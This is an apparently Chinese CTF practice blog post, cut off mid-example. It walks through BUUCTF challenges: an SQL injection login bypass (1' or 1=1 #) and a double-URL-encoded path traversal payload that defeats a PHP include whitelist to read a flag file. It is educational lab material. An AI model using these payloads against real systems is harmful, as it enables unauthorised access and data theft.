@@ -1,0 +1,1647 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+
+  
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-corner-indicator.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-icon.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="刷题," />
+
+
+
+
+
+  <link rel="alternate" href="/%5Bobject%20Object%5D" title="quan9i's blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言想找点不一样的题看看，因此来刷了几道buu的题，并记录如下 [极客大挑战 2019]EasySQL进入靶场，发现是登录的这种首先看能不能注入 121&amp;#x27;1 执行结果这说明是字符型注入，且包裹方式为单引号包裹，这里其实就不用再做了，万能一句一注就好了 121&amp;#x27;or 1&#x3D;1 #1 当然，常规办法肯定可行，流程依据是判断字段数，爆库，爆列名，爆字段，但这个题设置的很简单，在获取数据">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buuctf一天小练习">
+<meta property="og:url" content="https://quan9i.top/buuctf1/index.html">
+<meta property="og:site_name" content="quan9i&#39;s blog">
+<meta property="og:description" content="前言想找点不一样的题看看，因此来刷了几道buu的题，并记录如下 [极客大挑战 2019]EasySQL进入靶场，发现是登录的这种首先看能不能注入 121&amp;#x27;1 执行结果这说明是字符型注入，且包裹方式为单引号包裹，这里其实就不用再做了，万能一句一注就好了 121&amp;#x27;or 1&#x3D;1 #1 当然，常规办法肯定可行，流程依据是判断字段数，爆库，爆列名，爆字段，但这个题设置的很简单，在获取数据">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/abbee5b4024e411cb193b9aad7e1613d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/349ddec0aa1143c491681dff96bbe5ee.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/773bb0bbb03c4d39940f61c48bda16f9.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a7d5e3f95a844de7902ed9836b3d0574.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/d6cb40eaf3074f5f99cbdc9907acddbc.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e08ee6e4025b4489a3c77065d18fed4d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/fba46e14e36149b09a2eed4c80e4b250.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/5bdbeb34d0b24a0288dc15b531798e69.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a2f91101db5941f0abb457cdff52278f.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/8128126e58ef45ee8fdd2ed4df06616d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/230707b19b2745c3881d45bd5cbb25e9.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/330c9eb372e34a499e4afd4d70245da3.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/b0479c768e804bcb9f527f4c26bf1654.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/888c9fbe587f455dbcf2e6ca9eed6c3a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/60dfbec943fa4203bbd5c38b1b567d3a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/074903cc1a2a4aa0bf729b49b6d508a7.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/1777be4a33554a6c9e08f3df84bfb2e7.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/f57d4991289e426ba938c597dca992ca.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/da6a175ad89e4fa6ab6c4a3711a34392.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/585a35dd2ee34a3b95950b0bc482db48.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/0da6621f8608476fb24ddec36ef97836.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/b3261e2fbcc146618afb8bdb5d3c533d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/020592e506954f138813589f058e4318.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/f90bd190ebdf42b58ba7cf38c2532807.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/d3b47b6e4d914e44b9da5506c6365537.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/3fc6d73ab5724a789bed8e837e6bdb1c.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/15abf68c80964be0960097e19fc5fce3.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/46afb5bd5f3e43a6ba258164220d51a8.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/22ac05d2ed044f28a61117804dea0c68.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/3b7ed906057d4550adb1ecb68211e86d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/6909b24526394d09962e82157a952556.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/6923a1bb5ebf41c9a4837909429e3e43.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/eb9d1d30716246e0a059139943f5edef.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/7a17a8efe1c34425bb7db4ecff4d52e5.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/9d92a6c2b17645c7b4b3b133102d60f2.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/8d7027a80f5546efaa415e67ed85a5a5.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/4ec3ee27cf2849f89e30a5e17aff2062.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/d347b81cacc84393b6b4a6f9132de26a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/69d8d764dee7474f9d236315b7f13d9f.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/c0c2edad2d1b47b59ea378656696d226.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e1020b9ab52344e5a3499df773679f29.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/4f2925e34cec491986dd0d9bcb7af16b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/abbe1f87e8ae4765a53ec73484b13718.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/543859f919524468b7e3f129adeae606.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/53b2758346ba4467bde24cb50c04a306.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/ff089f36800840a0b2eaaff057e8f8bb.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/4d7b5eb493af48258ed5b858e6f130e7.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/c75d8c0c73f74dc586d12e5e1838307b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/afb899ba64864c4e889733e2d2a40c30.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/fe515cdfcc2748bd862eeb899cbb281c.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/8d21bb56515f4ecd849d3e9bb985acff.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e4e6b7193e9f46bf922613881ab9a123.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/0b31b7649a41475aa7d1fed6e8c6e55a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/693328089a404c17bd346e003c1678c8.png">
+<meta property="article:published_time" content="2022-03-20T12:39:21.890Z">
+<meta property="article:modified_time" content="2022-03-20T12:41:25.388Z">
+<meta property="article:author" content="quan9i">
+<meta property="article:tag" content="刷题">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/abbee5b4024e411cb193b9aad7e1613d.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://quan9i.top/buuctf1/"/>
+
+
+
+
+
+  <title>buuctf一天小练习 | quan9i's blog</title>
+  
+
+
+
+
+
+
+
+
+
+    <!--pjax：防止跳转页面音乐暂停-->
+  <script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script> 
+<meta name="generator" content="Hexo 5.4.0"><style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}</style></head>
+<script type="text/javascript" src="/lib/clipboard/clipboard.js"></script>
+<script type="text/javascript" src="/js/src/custom.js"></script>
+
+
+
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/src/fireworks.js"></script>
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">quan9i's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">少年有梦不应止于心动 更要付诸 行动</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-star-half-o"></i> <br />
+            
+            精选文案
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-liuyan">
+          <a href="/liuyan/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            留言
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-link"></i> <br />
+            
+            友链
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-zanshang">
+          <a href="/zanshang/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-rocket"></i> <br />
+            
+            赞赏
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+<script src="/live2d-widget/autoload.js"></script>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://quan9i.top/buuctf1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/2.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="quan9i's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">buuctf一天小练习</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-03-20T20:39:21+08:00">
+                2022-03-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/buuctf1/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/buuctf1/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.7k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  10
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1><span id="前言">前言</span></h1><p><img src="https://img-blog.csdnimg.cn/abbee5b4024e411cb193b9aad7e1613d.png" alt="在这里插入图片描述"><br>想找点不一样的题看看，因此来刷了几道buu的题，并记录如下</p>
+<h1><span id="极客大挑战-2019easysql">[极客大挑战 2019]EasySQL</span></h1><p>进入靶场，发现是登录的这种<br><img src="https://img-blog.csdnimg.cn/349ddec0aa1143c491681dff96bbe5ee.png" alt="在这里插入图片描述">首先看能不能注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">1</span></span><br></pre></td></tr></table></figure>
+<p>执行结果<br><img src="https://img-blog.csdnimg.cn/773bb0bbb03c4d39940f61c48bda16f9.png" alt="在这里插入图片描述"><br>这说明是字符型注入，且包裹方式为单引号包裹，这里其实就不用再做了，万能一句一注就好了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;or 1=1 #</span></span><br><span class="line"><span class="string">1</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/a7d5e3f95a844de7902ed9836b3d0574.png" alt="在这里插入图片描述">当然，常规办法肯定可行，流程依据是判断字段数，爆库，爆列名，爆字段，但这个题设置的很简单，在获取数据库时就会爆出flag，具体过程不再演示。</p>
+<h1><span id="hctf-2018warmup">[HCTF 2018]WarmUp</span></h1><p>进入靶场<br><img src="https://img-blog.csdnimg.cn/d6cb40eaf3074f5f99cbdc9907acddbc.png" alt="在这里插入图片描述"><br>这时候就一个表情，看啥呢，当然是看源码<br><img src="https://img-blog.csdnimg.cn/e08ee6e4025b4489a3c77065d18fed4d.png" alt="在这里插入图片描述">访问注释的文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);<span class="comment">//语法高亮</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span> //定义一个类</span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];<span class="comment">// 声明白名单数组</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;	<span class="comment">//如果page没被定义或不是字符串</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123; <span class="comment">//如果变量page在白名单中</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr( <span class="comment">//从最开始开始截取$page，截取到&#x27;？&#x27;前，但它后面在最后拼接了个？，其实这就是原样，只是换了个变量名</span></span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123; <span class="comment">//如果变量在白名单中，返回true</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>); <span class="comment">//将变量page进行url解码赋值给变量_page</span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(  <span class="comment">//截取？前的赋给变量_page</span></span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123; <span class="comment">//如果在白名单中，返回true</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]) 如果变量file非空且为字符串且符号上面的那些要求</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]; <span class="comment">#include 变量file</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>此时一大波代码映入眼帘，发现还有一个文件hint.php，访问一下<br><img src="https://img-blog.csdnimg.cn/fba46e14e36149b09a2eed4c80e4b250.png" alt="在这里插入图片描述">看这个样子应该是给出了flag所在的文件名<br>emmm，然后就开始分析代码吧（我在下介绍一下用到的函数）<br>可以发现定义的那个类需要都满足true，才能往下继续进行，所以从上往下看，<br>第一个if语句要求非空且为字符串，这个比较容易，<br>再看第二个if语句，这个想要能正确执行的话，我们只能输入<code>file=source.php</code>或者<code>file=hint.php</code>，不过这个执行失败进行的是截取,而不是返回false,因此我们不用管这个就行,<br>第三个if语句也是如此,不过他在失败后是先对变量进行了url解码然后再截取，然后检测是否还在白名单中，<br>再看第四个,第四个if是匹配白名单的,如果在白名单中才会返回true,而我们需要返回结果为true,因此我们需要让第四个执行正确,也就是说我们需要此时的语句在白名单中,那我们倒推一下,此时payload为<code>source.php</code>在往上看,截取之前就是<code>source.php?xxxx</code>,再往上发现有一次解码,说明我们在这里对?进行一次编码,才能往下得到?,因此payload就是<code>source.php%3fxxxxx</code>,我们知道服务器端自动解码一次,所以我们需要再编码一次,payload如下方</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php?%<span class="number">253</span>fxxxx</span><br><span class="line"><span class="comment">//%253f是二次编码后的?</span></span><br></pre></td></tr></table></figure>
+<p>当然我们也可以直接在source后直接加上<code>?xxxx</code>,这样?就会被截取,返回的最终结果也是true<br>科普一个小知识</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">. </span>.表示当前目录的上一级目录。</span><br><span class="line"><span class="bullet">. </span>./表示当前目录下的某个文件或文件夹，视后面跟着的名字而定</span><br></pre></td></tr></table></figure>
+
+
+<p>此时我们想起来hint中的注释，我们在这里直接通过../来查找flag，构造最终payload如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php?%<span class="number">253</span>f/../../../../ffffllllaaaagggg</span><br><span class="line">或</span><br><span class="line">?file=source.php?/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/5bdbeb34d0b24a0288dc15b531798e69.png" alt="在这里插入图片描述"><br>部分函数介绍</p>
+<p><code>my_substr</code>:截取函数，类似于substr，示例如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> mb_substr(<span class="string">&quot;菜鸟教程&quot;</span>, <span class="number">0</span>, <span class="number">2</span>); </span><br><span class="line"> <span class="comment">// 输出：菜鸟</span></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>my_strpos(被查字符串,寻找的字符串,起始位置) </code>:函数查找字符串在另一字符串中第一次出现的位置（区分大小写）。示例如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> strpos(<span class="string">&quot;Hello world!&quot;</span>,<span class="string">&quot;world&quot;</span>);<span class="comment">//输出为6，之所以不是7是因为字符串第一位为0而不是1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>in_array</code>:搜索数组中是否存在指定的值。示例如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$people</span> = <span class="keyword">array</span>(<span class="string">&quot;Bill&quot;</span>, <span class="string">&quot;Steve&quot;</span>, <span class="string">&quot;Mark&quot;</span>, <span class="string">&quot;David&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="string">&quot;Mark&quot;</span>, <span class="variable">$people</span>))</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;匹配已找到&quot;</span>;</span><br><span 